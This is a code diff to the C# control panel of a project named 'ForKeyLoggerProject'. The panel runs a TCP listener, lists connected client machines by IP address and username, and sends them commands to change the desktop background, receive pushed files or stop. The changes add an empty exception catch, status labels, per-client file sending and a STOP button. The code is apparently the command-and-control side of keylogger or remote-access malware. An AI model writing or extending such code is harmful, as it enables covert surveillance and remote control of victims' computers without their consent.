@@ -14,6 +14,7 @@ using System.Threading;
 
 namespace ForKeyLoggerProject
 {
+
     public partial class Main : Form
     {
         int port;
@@ -42,9 +43,16 @@ namespace ForKeyLoggerProject
             listener.Start(); 
             while (true)
             {
-                Connection clientConnection = new Connection(listener.AcceptTcpClient()); 
-                clientConnection.DisconnectedEvent += new Connection.Disconnected(clientConnection_DisconnectedEvent);
-                clientConnection.ReceivedEvent += new Connection.Received(clientConnection_ReceivedEvent);
+                try {
+                    Connection clientConnection = new Connection(listener.AcceptTcpClient());
+                    clientConnection.DisconnectedEvent += new Connection.Disconnected(clientConnection_DisconnectedEvent);
+                    clientConnection.ReceivedEvent += new Connection.Received(clientConnection_ReceivedEvent);
+                }
+                catch
+                {
+
+                }
+                
             }
         }
 
@@ -104,7 +112,7 @@ namespace ForKeyLoggerProject
         {
             ListViewItem item = new ListViewItem();
             item.Text = client.IPAddress;
-            ipaddress1 = client.IPAddress; 
+            //ipaddress1 = client.IPAddress; 
             item.SubItems.Add("Idle");
             item.SubItems.Add(usernambes);
             if (info != null)
@@ -138,6 +146,7 @@ namespace ForKeyLoggerProject
                     item.SubItems[1].Text = Status;
                     break; 
                 }
+
         }
 
         delegate void _Username(Connection client, String Username); //tekur á máti usernameinu og setur það í public preytu
@@ -209,9 +218,12 @@ namespace ForKeyLoggerProject
 
         private void btnChangeBG_Click(object sender, EventArgs e)
         {
+            
             foreach (ListViewItem item in lstBoxUsers.Items)
             {
                 Connection client = (Connection)item.Tag;
+                lstBoxUsers.Items[0].SubItems[1].Text = "BG Change: Sent";
+                lstBoxUsers.Update();
                 client.Send("BGROUNDCHANGE|");
             }
         }
@@ -236,16 +248,7 @@ namespace ForKeyLoggerProject
                     }
                 }
             }
-
-            /*
-            using (OpenFileDialog openFileDialog1 = new OpenFileDialog())
-            { 
-                DialogResult result = openFileDialog1.ShowDialog();
-                if(result == DialogResult.OK) // Test result.
-                {
-                }
-            }
-             */
+            button2.Enabled = true;
         }
 
         private void button2_Click(object sender, EventArgs e)
@@ -253,9 +256,13 @@ namespace ForKeyLoggerProject
             foreach (ListViewItem item in lstBoxUsers.Items)
             {
                 Connection client = (Connection)item.Tag;
+                lstBoxUsers.Items[0].SubItems[1].Text = "Data: Sent";
+                lstBoxUsers.Update();
+                ipaddress1 = client.IPAddress;
                 client.Send("FILE|");
+                SendFile(file);
             }
-            SendFile(file);
+            btnChangeBG.Enabled = true; 
         }
         public static void SendFile(string fName)
         {
@@ -284,7 +291,9 @@ namespace ForKeyLoggerProject
                 fNameByte.CopyTo(clientData, 4);
                 fileData.CopyTo(clientData, 4 + fNameByte.Length);
                 sock.Connect(end);
+                Thread.Sleep(1000);
                 sock.Send(clientData);
+                Thread.Sleep(100);
                 sock.Close();
             }
             catch (Exception ex)
@@ -293,6 +302,13 @@ namespace ForKeyLoggerProject
             }
         }
 
-
+        private void button3_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in lstBoxUsers.Items)
+            {
+                Connection client = (Connection)item.Tag;
+                client.Send("STOP|");
+            }
+        }
     }
 }
